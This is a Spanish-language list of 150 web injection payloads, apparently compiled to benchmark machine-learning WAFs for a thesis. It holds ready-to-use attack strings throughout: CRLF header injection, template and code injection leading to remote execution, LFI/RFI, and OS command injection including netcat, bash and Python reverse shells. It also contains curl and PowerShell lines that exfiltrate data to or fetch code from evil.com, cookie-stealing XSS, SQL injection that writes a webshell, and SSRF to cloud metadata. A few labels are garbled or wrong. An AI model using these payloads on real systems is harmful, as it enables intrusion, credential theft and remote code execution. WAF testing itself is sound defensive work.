# 150 Payloads de Inyección — OWASP A05:2025
## Para benchmark de WAF-ML v3

> **Propósito académico:**这套 de payloads para evaluar la capacidad de detección de WAFs
> en entornos PYMES simulados. Tesis: Fernandez Alva, E. — USAT, Perú 2026.
>
> **Clasificación:** OWASP A05:2025 — Injection
> **Endpoints base:** `/api/v1/login`, `/api/v1/search`, `/api/v1/products`,
> `/api/v1/users`, `/api/v1/clients`, `/api/v1/contact`, `/upload`

---

## CWE-93 — CRLF Injection / HTTP Response Splitting
**Cantidad:** 30 payloads

1. `search=foo%0d%0aX-Injected:%20true`
   - Método: GET
   - Endpoint: `/api/v1/search`
   - CRLF básico en query string — inyecta header personalizado

2. `search=foo%0aX-Injected:%20true`
   - Método: GET
   - Endpoint: `/api/v1/search`
   - CRLF solo con LF (sin CR), bypass de WAFs que buscan `%0d%0a` exacto

3. `username=admin%0d%0aSet-Cookie:%20session=hijacked%3B%20Path=%2F&password=pass`
   - Método: POST
   - Endpoint: `/api/v1/login`
   - CRLF en body POST — intenta setear cookie de sesión maliciosa

4. `%0d%0aHTTP/1.0%20404%20Not%20Found%0d%0a`
   - Método: GET
   - Endpoint: `/api/v1/products?category=1`
   - CRLF en path — intenta dividir la respuesta HTTP

5. `redirect=%0d%0aLocation:%20http://evil.com%0d%0a`
   - Método: GET
   - Endpoint: `/api/v1/login?redirect=`
   - CRLF en parámetro de redirect — intenta redirección forzada

6. `user-agent=foo%0d%0aContent-Length:%200%0d%0a%0d%0a`
   - Método: GET
   - Endpoint: cualquier (inyección en header User-Agent)
   - CRLF en header — intenta terminar la respuesta prematuramente

7. `name=John%0d%0a%0d%0a<script>alert(1)</script>`
   - Método: POST
   - Endpoint: `/api/v1/contact`
   - CRLF + XSS combinado — doble CRLF para inyectar body HTML

8. `%0d%0aTransfer-Encoding:%20chunked%0d%0a`
   - Método: GET
   - Endpoint: `/api/v1/products?id=1`
   - CRLF para inyectar chunked encoding — puede causar request smuggling

9. `search=a%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<h1>owned</h1>`
   - Método: GET
   - Endpoint: `/api/v1/search`
   - CRLF con mayúsculas + Content-Type injection para XSS reflejado

10. `lang=en%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a`
    - Método: GET
    - Endpoint: `/api/v1/products?lang=en`
    - CRLF para spoofear IP interna

11. `page=1%0d%0aSet-Cookie:%20admin=1;%20Path=/`
    - Método: GET
    - Endpoint: `/api/v1/users?page=1`
    - CRLF para escalar privilegios via cookie injection

12. `%0d%0a%0d%0a<?php%20system($_GET['cmd']);%20?>`
    - Método: GET
    - Endpoint: `/api/v1/search?q=test`
    - CRLF + PHP code injection — doble CRLF para terminar headers e inyectar código

13. `file=test%0d%0aX-Server:%20Hacked`
    - Método: GET
    - Endpoint: `/download?file=test`
    - CRLF en endpoint de descarga — inyección de header Server falso

14. `%0a%0d%0a%0dLocation:%20//evil.com`
    - Método: GET
    - Endpoint: `/api/v1/redirect?url=`
    - CRLF con orden invertido (LF+CR) para evadir detección

15. `search=foo%0d%0aExpires:%200%0d%0aCache-Control:%20no-cache`
    - Método: GET
    - Endpoint: `/api/v1/search`
    - CRLF para inyectar headers de control de caché

16. `token=abc%0d%0aAccess-Control-Allow-Origin:%20*`
    - Método: POST
    - Endpoint: `/api/v1/login`
    - CRLF para deshabilitar CORS

17. `callback=jsonp%0d%0aX-Content-Type-Options:%20nosniff`
    - Método: GET
    - Endpoint: `/api/v1/data?callback=jsonp`
    - CRLF en callback JSONP

18. `view=profile%0d%0aRefresh:%200;%20url=http://evil.com`
    - Método: GET
    - Endpoint: `/api/v1/users?view=profile`
    - CRLF para refresh redirect automático

19. `%0d%0a%0d%0a<html><body><script>document.cookie</script></body></html>`
    - Método: POST
    - Endpoint: `/api/v1/feedback`
    - CRLF para inyectar HTML completo en respuesta

20. `a%00%0d%0aX-Custom:%20injected`
    - Método: GET
    - Endpoint: `/api/v1/search?q=a`
    - CRLF con null byte prefix — evasión de parsers

21. `search=test%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0A`
    - Método: GET
    - Endpoint: `/api/v1/search`
    - CRLF para inyectar status line falso

22. `user=admin%0d%0a%0d%0a{"user":"admin","role":"admin"}`
    - Método: POST
    - Endpoint: `/api/v1/login`
    - CRLF + JSON injection para manipular respuesta API

23. `page=2%0d%0aP3P:%20CP=%22IDC%22`
    - Método: GET
    - Endpoint: `/api/v1/products?page=2`
    - CRLF inyectando header P3P (obsoleto pero algunos parsers lo procesan)

24. `%0d%0a%0d%0a<%=20system('ls')%20%>`
    - Método: GET
    - Endpoint: `/search?q=test`
    - CRLF + ERB code injection (Ruby/Rails)

25. `q=test%0d%0aContent-Disposition:%20attachment;%20filename=evil.html`
    - Método: GET
    - Endpoint: `/api/v1/search`
    - CRLF para forzar descarga de contenido como archivo HTML

26. `%0d%0aSet-Cookie:%20PHPSESSID=evil;%20domain=.victim.com`
    - Método: GET
    - Endpoint: `/index.php?page=1`
    - CRLF para cookie poisoning cross-domain

27. `%0d%0aLink:%20<%20http://evil.com%20>;%20rel=%22stylesheet%22`
    - Método: GET
    - Endpoint: `/api/v1/products?format=html`
    - CRLF para inyectar stylesheet externo (CSS injection)

28. `destination=%0d%0a%0d%0a<html%20onload=%22fetch('http://evil.com?c='%2Bdocument.cookie)%22>`
    - Método: GET
    - Endpoint: `/redirect?destination=`
    - CRLF + HTML con exfiltración de cookies

29. `%0D%0A%20X-CRLF-Injected:%20true%0D%0A`
    - Método: POST
    - Endpoint: `/api/v1/login` (en header personalizado)
    - CRLF con espacio inicial para evadir regex estrictos

30. `search=foo%ef%bc%8d%ef%bc%8d%0d%0aX-Injected:%20true`
    - Método: GET
    - Endpoint: `/api/v1/search`
    - Unicode full-width hyphen antes del CRLF — bypass de WAFs que buscan `-` o `%0d%0a`

---

## CWE-94 / CWE-95 — Code Injection y Eval Injection
**Cantidad:** 25 payloads

31. `name=John&message=${7*7}`
    - Método: POST
    - Endpoint: `/api/v1/contact`
    - Server-Side Template Injection (SSTI) básico — expresión `${}`

32. `name={{7*7}}`
    - Método: POST
    - Endpoint: `/api/v1/contact`
    - SSTI con doble llave (Jinja2, Twig, Handlebars)

33. `name=John&message={{config}}`
    - Método: POST
    - Endpoint: `/api/v1/contact`
    - SSTI para leak de configuración de Flask

34. `q=<%= system("whoami") %>`
    - Método: GET
    - Endpoint: `/api/v1/search`
    - ERB code injection clásico (Ruby on Rails)

35. `username=${java.lang.Runtime.getRuntime().exec('id')}`
    - Método: POST
    - Endpoint: `/api/v1/login`
    - SSTI con ejecución de comando Java (Spring Boot / Thymeleaf)

36. `file=`; system("cat /etc/passwd"); $a=`
    - Método: GET
    - Endpoint: `/download?file=`
    - PHP code injection via concatenación de strings

37. `data=1;print(`$_GET[1]`);`
    - Método: GET
    - Endpoint: `/api/v1/data?data=1`
    - Perl/PHP eval-like injection

38. `message=${T(java.lang.Runtime).getRuntime().exec('curl http://evil.com')}`
    - Método: POST
    - Endpoint: `/api/v1/feedback`
    - SSTI avanzado Java/Spring — ejecución remota vía expresión

39. `name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
    - Método: POST
    - Endpoint: `/api/v1/contact`
    - SSTI en Twig PHP — RCE via filtro

40. `q={{''.__class__.__mro__[2].__subclasses__()}}`
    - Método: GET
    - Endpoint: `/search?q=`
    - SSTI en Jinja2 para enumeración de clases Python

41. `cmd=eval(compile('import%20os;os.system("id")','<string>','exec'))`
    - Método: POST
    - Endpoint: `/api/v1/admin/eval`
    - Python code injection vía eval + compile

42. `expr=1;require('child_process').execSync('whoami')`
    - Método: GET
    - Endpoint: `/api/v1/calc?expr=1`
    - Node.js code injection via child_process

43. `username=admin'%3B+DROP+TABLE+users%3B+--`
    - Método: POST
    - Endpoint: `/api/v1/login`
    - Second-order code injection — SQLi que parece code injection

44. `file=php://filter/convert.base64-encode/resource=config.php`
    - Método: GET
    - Endpoint: `/download?file=`
    - PHP filter chain para leer archivos codificados en base64

45. `file=php://filter/convert.iconv.utf-8.utf-7/resource=index.php`
    - Método: GET
    - Endpoint: `/download?file=`
    - PHP filter con iconv — evasión via charset conversion

46. `data=php://input`
    - Método: POST
    - Endpoint: `/api/v1/upload?data=php://input`
    - PHP input stream — ejecuta body como código PHP

47. `file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==`
    - Método: GET
    - Endpoint: `/download?file=`
    - PHP data URI con base64 — ejecuta `<?php system('id'); ?>`

48. `name={{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`
    - Método: POST
    - Endpoint: `/api/v1/contact`
    - SSTI Jinja2 — RCE completo encadenando clases Python

49. `expr=java.lang.Runtime.getRuntime().exec("ping -c 1 evil.com")`
    - Método: GET
    - Endpoint: `/api/v1/calc?expr=`
    - Java expression injection (SpEL)

50. `user=T(java.lang.String).forName('java.lang.Runtime').getMethod('exec',T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),'id')`
    - Método: POST
    - Endpoint: `/api/v1/login`
    - SpEL injection con reflexión Java completa

51. `sort=((SELECT flag FROM flags LIMIT 1))`
    - Método: GET
    - Endpoint: `/api/v1/products?sort=price`
    - GraphQL injection — query compleja en campo sort

52. `name=<script>alert(1)</script>`
    - Método: POST
    - Endpoint: `/api/v1/contact`
    - XSS básico como forma de code injection en contexto JS

53. `__proto__.isAdmin=true`
    - Método: POST
    - Endpoint: `/api/v1/users` (JSON body)
    - Prototype pollution (Node.js) — manipula prototype para escalar privilegios

54. `constructor.prototype.isAdmin=true`
    - Método: POST
    - Endpoint: `/api/v1/users` (JSON body)
    - Prototype pollution vía constructor

55. `{"__proto__": {"admin": true}}`
    - Método: POST
    - Endpoint: `/api/v1/login` (JSON body)
    - Prototype pollution en JSON parse — merge de objetos

---

## CWE-98 — PHP RFI y LFI
**Cantidad:** 25 payloads

56. `page=../../../etc/passwd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI clásico con path traversal

57. `page=..%2F..%2F..%2Fetc%2Fpasswd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI con URL encoding de slashes

58. `page=....//....//....//etc/passwd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI con doble punto + doble slash — evasión de replace(`../`, ``)

59. `page=..%252F..%252F..%252Fetc%252Fpasswd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI con doble URL encoding — bypass de decode + sanitize

60. `page=..\..\..\windows\win.ini`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI Windows con backslashes

61. `page=php://filter/read=convert.base64-encode/resource=config.php`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - PHP filter wrapper para LFI con base64

62. `page=php://filter/convert.base64-encode/resource=/etc/passwd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - PHP filter + ruta absoluta

63. `page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - PHP filter chain — compresión + base64 para evasión

64. `page=php://input`
    - Método: POST
    - Endpoint: `/index.php?page=php://input` (body: `<?php system('id'); ?>`)
    - PHP input stream — ejecuta POST body como código

65. `page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - PHP data URI — inyecta `<?php system('ls'); ?>`

66. `page=data://text/plain,<?php+system('id');?>`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - PHP data URI en texto plano (sin base64)

67. `page=expect://id`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - PHP expect wrapper — ejecución directa de comando (Requiere extensión expect)

68. `file=php://filter/convert.iconv.utf-8.utf-16/resource=shell.php`
    - Método: GET
    - Endpoint: `/download?file=`
    - PHP filter con iconv — modifica charset para evadir inspección

69. `page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI con encoding carácter por carácter

70. `page=..;/..;/..;/etc/passwd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI con estilo Java (..;) — bypass en Tomcat

71. `page=/etc/passwd%00`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI con null byte — antiguo bypass de extension append

72. `file=../../../etc/passwd%00.png`
    - Método: GET
    - Endpoint: `/download?file=`
    - LFI con null byte + extensión falsa

73. `template=../../../../etc/passwd~`
    - Método: GET
    - Endpoint: `/admin?template=`
    - LFI con tilde (~) — archivo de backup/swap

74. `view=php://filter/read=convert.base64-encode/resource=../admin/config`
    - Método: GET
    - Endpoint: `/panel?view=`
    - LFI con filter + path traversal combinado

75. `page=.......//.......//.......//etc/passwd`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - LFI con triple punto — bypass de replace(`../`, ``)

76. `include=HTTP://evil.com/shell.txt?`
    - Método: GET
    - Endpoint: `/index.php?include=`
    - RFI básico con URL absoluta HTTP

77. `file=ftp://evil.com/shell.txt`
    - Método: GET
    - Endpoint: `/download?file=`
    - RFI con protocolo FTP

78. `page=http://evil.com/shell.php?cmd=ls`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - RFI con payload en query string

79. `page=//evil.com/shell.txt`
    - Método: GET
    - Endpoint: `/index.php?page=`
    - RFI con protocol-relative URL

80. `include=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%73%68%65%6c%6c`
    - Método: GET
    - Endpoint: `/index.php?include=`
    - RFI con URL hexadecimal-encoded — evasión de WAF

---

## CWE-77 / CWE-78 — OS Command Injection
**Cantidad:** 30 payloads

81. `document=12345678+%7C+ls+-la`
    - Método: GET
    - Endpoint: `/api/v1/persons/find?document=`
    - Pipe injection clásico

82. `host=8.8.8.8;whoami`
    - Método: GET
    - Endpoint: `/api/v1/ping?host=`
    - Semicolon injection

83. `ip=127.0.0.1%20%7C%7C%20id`
    - Método: GET
    - Endpoint: `/api/v1/ping?ip=`
    - Double pipe OR injection

84. `domain=google.com%26%26whoami`
    - Método: GET
    - Endpoint: `/api/v1/whois?domain=`
    - Double ampersand AND injection

85. `url=http://example.com%60id%60`
    - Método: GET
    - Endpoint: `/api/v1/fetch?url=`
    - Backtick injection

86. `ip=127.0.0.1$(whoami)`
    - Método: GET
    - Endpoint: `/api/v1/ping?ip=`
    - Command substitution con $()

87. `ip=127.0.0.1`whoami``
    - Método: GET
    - Endpoint: `/api/v1/ping?ip=`
    - Nested backticks

88. `target=example.com|ping+-c+5+evil.com`
    - Método: GET
    - Endpoint: `/api/v1/traceroute?target=`
    - Pipe con comando largo

89. `file=test.txt;cat+/etc/passwd;#`
    - Método: GET
    - Endpoint: `/download?file=`
    - Semicolons + comentario shell

90. `host=google.com%0Aid`
    - Método: GET
    - Endpoint: `/api/v1/ping?host=`
    - Newline injection (LF) como separador de comandos

91. `cmd=echo+hello+%26%26+cat+/etc/shadow+%23`
    - Método: POST
    - Endpoint: `/api/v1/exec`
    - Command injection con && y comentario

92. `ip=192.168.1.1%7C%7Cnc+-e+/bin/sh+evil.com+4444`
    - Método: GET
    - Endpoint: `/api/v1/ping?ip=`
    - Reverse shell via netcat pipe

93. `domain=google.com`curl+http://evil.com/$(id)``
    - Método: GET
    - Endpoint: `/api/v1/whois?domain=`
    - Backtick con exfiltración de datos

94. `path=/var/log;ls+-la+/etc`
    - Método: GET
    - Endpoint: `/api/v1/files?path=`
    - Semicolons para cambiar de comando

95. `address=127.0.0.1|ping+-n+3+127.0.0.1`
    - Método: GET
    - Endpoint: `/api/v1/ping?address=`
    - Pipe con flag Windows (-n)

96. `server=localhost|nslookup+evil.com+127.0.0.1`
    - Método: GET
    - Endpoint: `/api/v1/dns?server=`
    - Comando nslookup inyectado en parámetro DNS

97. `ip=127.0.0.1|bash+-c+'{echo,ICAgPz4gL2Rldi90Y3AvZXZpbC5jb20vNDQ0NA=='}|{base64,-d}|{bash,-i}'`
    - Método: GET
    - Endpoint: `/api/v1/ping?ip=`
    - Base64 encoded reverse shell via bash -c

98. `user=admin&cmd=${IFS}whoami`
    - Método: POST
    - Endpoint: `/api/v1/admin/run`
    - Command injection con ${IFS} como separador (evasión de espacios)

99. `cmd=dir%20/s%20*.exe`
    - Método: GET
    - Endpoint: `/api/v1/exec?cmd=`
    - Comando Windows dir con espacio URL-encoded

100. `target=example.com|powershell+-Command+"Invoke-Expression(New-Object+Net.WebClient).DownloadString('http://evil.com/ps.ps1')"`
     - Método: GET
     - Endpoint: `/api/v1/traceroute?target=`
     - PowerShell remote download + ejecución

101. `ip=127.0.0.1%0a/usr/bin/id`
     - Método: GET
     - Endpoint: `/api/v1/ping?ip=`
     - Newline + ruta absoluta de comando

102. `file=test$(whoami).txt`
     - Método: GET
     - Endpoint: `/api/v1/files?file=`
     - Command substitution incrustado en nombre de archivo

103. `host=127.0.0.1|curl+http://evil.com/$(id)+-o+/dev/null`
     - Método: GET
     - Endpoint: `/api/v1/ping?host=`
     - Pipe con curl para exfiltrar data vía HTTP

104. `ip=127.0.0.1%26%26echo+Y2F0IC9ldGMvcGFzc3dk|base64+-d|bash`
     - Método: GET
     - Endpoint: `/api/v1/ping?ip=`
     - && con base64 decode + bash pipe

105. `host=google.com$(curl${IFS}http://evil.com)`
     - Método: GET
     - Endpoint: `/api/v1/ping?host=`
     - Command substitution + IFS como space bypass

106. `cmd=ping%20127.0.0.1%20%26%20whoami%20%26%20dir`
     - Método: GET
     - Endpoint: `/api/v1/exec?cmd=`
     - Múltiples comandos con & (background) en Windows

107. `url=http://example.com|(cat+/etc/passwd)`
     - Método: GET
     - Endpoint: `/api/v1/fetch?url=`
     - Pipe con subshell parenthesized

108. `ip=127.0.0.1%0a%0d%0a%0dwhoami`
     - Método: GET
     - Endpoint: `/api/v1/ping?ip=`
     - CRLF + newline como separador multiple

109. `address=127.0.0.1%7C%7Cpython3+-c+'import+socket,subprocess,os%3Bs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%3Bs.connect(("10.0.0.1",1234))%3Bos.dup2(s.fileno(),0)%3B+os.dup2(s.fileno(),1)%3B+os.dup2(s.fileno(),2)%3Bimport+pty%3B+pty.spawn("sh")'`
     - Método: GET
     - Endpoint: `/api/v1/ping?address=`
     - Reverse shell en Python vía pipe

110. `server=8.8.8.8|tee+/tmp/output`
     - Método: GET
     - Endpoint: `/api/v1/dns?server=`
     - Pipe con tee para persistir salida

---

## CWE-89 — SQL Injection
**Cantidad:** 25 payloads

111. `username=admin' OR '1'='1&password=ignored`
     - Método: POST
     - Endpoint: `/api/v1/login`
     - SQLi clásico tautología OR

112. `search='; DROP TABLE products; --`
     - Método: GET
     - Endpoint: `/api/v1/products?search=`
     - SQLi con DROP TABLE (stacked queries)

113. `id=1 UNION SELECT username,password FROM users--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - SQLi UNION extraction

114. `email=test@test.com'+AND+(SELECT+COUNT(*)+FROM+users)>0--`
     - Método: POST
     - Endpoint: `/api/v1/login`
     - SQLi blind — validación de existencia

115. `id=1 AND SLEEP(5)--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - Time-based SQLi MySQL

116. `id=1' WAITFOR DELAY '0:0:5'--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - Time-based SQLi SQL Server

117. `id=1 AND 1234=IF(SUBSTRING((SELECT DB_NAME()),1,1)='m',SLEEP(5),0)--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - Time-based con extracción de caracter

118. `search=admin' OR '1'='1' /*`
     - Método: GET
     - Endpoint: `/api/v1/users?search=`
     - SQLi con comentario de bloqueo

119. `username=admin'--`
     - Método: POST
     - Endpoint: `/api/v1/login`
     - SQLi comentario inline básico

120. `name=John'+UNION+SELECT+@@version,null,null--`
     - Método: POST
     - Endpoint: `/api/v1/contact`
     - SQLi UNION con variable de versión

121. `search=admin' UNION SELECT 1,2,3,4,5,6,7,8,9,10--`
     - Método: GET
     - Endpoint: `/api/v1/users?search=`
     - SQLi UNION con columnas enumeradas

122. `id=1'+AND+1=2+UNION+SELECT+1,group_concat(table_name),3,4,5,6,7,8,9,10+FROM+information_schema.tables--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - SQLi enumeración de tablas via information_schema

123. `id=1'+EXEC+xp_cmdshell('whoami')--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - SQLi MSSQL con xp_cmdshell para RCE

124. `search=admin'+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10+FROM+dual--`
     - Método: GET
     - Endpoint: `/api/v1/users?search=`
     - SQLi UNION ALL con tabla dual (Oracle)

125. `username=admin'+OR+EXISTS(SELECT+1+FROM+users+WHERE+username='admin'+AND+SUBSTRING(password,1,1)='a')--`
     - Método: POST
     - Endpoint: `/api/v1/login`
     - SQLi blind — extracción de password caracter por caracter

126. `search=test'+AND+ASCII(SUBSTRING((SELECT+password+FROM+users+WHERE+username='admin'),1,1))>64--`
     - Método: GET
     - Endpoint: `/api/v1/users?search=`
     - SQLi blind con comparación ASCII

127. `id=1'+AND+BENCHMARK(5000000,MD5('test'))--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - Time-based SQLi MySQL con BENCHMARK

128. `search=1' ORDER BY 10--`
     - Método: GET
     - Endpoint: `/api/v1/products?search=`
     - SQLi ORDER BY para determinar número de columnas

129. `search=1' GROUP BY 1,2,3,4,5,6,7,8,9,10 HAVING 1=1--`
     - Método: GET
     - Endpoint: `/api/v1/products?search=`
     - SQLi GROUP BY + HAVING para extraer información

130. `username=admin'/*!50000OR*/'1'='1`
     - Método: POST
     - Endpoint: `/api/v1/login`
     - SQLi con comentario MySQL version-specific (evasión)

131. `id=1'+UNION+SELECT+1,LOAD_FILE('/etc/passwd'),3,4,5,6,7,8,9,10--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - SQLi con LOAD_FILE para LFS (MySQL)

132. `search=admin' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET[cmd]); ?>'--`
     - Método: GET
     - Endpoint: `/api/v1/users?search=`
     - SQLi INTO OUTFILE para escribir webshell

133. `id=1'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--`
     - Método: GET
     - Endpoint: `/api/v1/products?id=`
     - Time-based SQLi con subquery anidada (evasión)

134. `username=admin'/**/OR/**/'1'/**/='1`
     - Método: POST
     - Endpoint: `/api/v1/login`
     - SQLi con comentarios como separadores (evasión de espacios)

135. `search=1' +UNION+SELECT+1,@@datadir,@@basedir,4,5,6,7,8,9,10+FROM+information_schema.tables--`
     - Método: GET
     - Endpoint: `/api/v1/products?search=`
     - SQLi con variables de entorno de base de datos

---

## CWE-22 — Path Traversal
**Cantidad:** 5 payloads

136. `file=../../../etc/shadow`
     - Método: GET
     - Endpoint: `/download?file=`
     - Path traversal básico a shadow

137. `file=....//....//....//etc/passwd`
     - Método: GET
     - Endpoint: `/download?file=`
     - Path traversal con bypass de replace doble

138. `file=%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log/apache2/access.log`
     - Método: GET
     - Endpoint: `/download?file=`
     - Path traversal a logs de Apache para log poisoning

139. `file=..%c0%ae..%c0%ae..%c0%aeetc/passwd`
     - Método: GET
     - Endpoint: `/download?file=`
     - Path traversal con Unicode overlong encoding (%c0%ae = .)

140. `file=/etc/passwd`
     - Método: GET
     - Endpoint: `/download?file=`
     - Ruta absoluta directa (sin path traversal)

---

## CWE-79 — XSS (Cross-Site Scripting)
**Cantidad:** 5 payloads

141. `search=<script>document.location='http://evil.com/?c='+document.cookie</script>`
     - Método: GET
     - Endpoint: `/api/v1/search`
     - XSS reflejado con exfiltración de cookies

142. `name=<img src=x onerror="fetch('http://evil.com/'+btoa(document.cookie))">`
     - Método: POST
     - Endpoint: `/api/v1/contact`
     - XSS con img tag y exfiltración base64

143. `message=<svg onload="new+Image().src='http://evil.com/?c='+document.cookie">`
     - Método: POST
     - Endpoint: `/api/v1/feedback`
     - XSS con SVG + Image beacon

144. `q="><script>alert(document.domain)</script>`
     - Método: GET
     - Endpoint: `/api/v1/search`
     - XSS con salida de contexto HTML (tag breaking)

145. `user=<body onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9ldmlsLmNvbS8/Jyttb3VzZV9vdmVyfHxzY3JvbGx8fGtleXByZXNz'))">`
     - Método: POST
     - Endpoint: `/api/v1/login`
     - XSS con onload + base64 encoded JS para evasión

---

## CWE-918 — Server-Side Request Forgery (SSRF)
**Cantidad:** 5 payloads

146. `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`
     - Método: GET
     - Endpoint: `/api/v1/fetch?url=`
     - SSRF a metadata AWS para credenciales IAM

147. `url=http://127.0.0.1:8080/admin/delete?user=all`
     - Método: GET
     - Endpoint: `/api/v1/proxy?url=`
     - SSRF a localhost para acciones administrativas internas

148. `url=file:///etc/passwd`
     - Método: GET
     - Endpoint: `/api/v1/fetch?url=`
     - SSRF con protocolo file para LFI

149. `url=http://[::1]:3306/login`
     - Método: GET
     - Endpoint: `/api/v1/proxy?url=`
     - SSRF con IPv6 loopback para evadir bloqueo de 127.0.0.1

150. `url=http://0x7f000001:6379/FLUSHALL`
     - Método: GET
     - Endpoint: `/api/v1/proxy?url=`
     - SSRF con IP hexadecimal + puerto Redis para comando FLUSHALL

---

## Resumen por CWE

| CWE | Nombre | Cantidad |
|-----|--------|----------|
| 93 | CRLF Injection | 30 |
| 94/95 | Code Injection / Eval | 25 |
| 98 | LFI / RFI | 25 |
| 77/78 | OS Command Injection | 30 |
| 89 | SQL Injection | 25 |
| 22 | Path Traversal | 5 |
| 79 | XSS | 5 |
| 918 | SSRF | 5 |
| **Total** | | **150** |
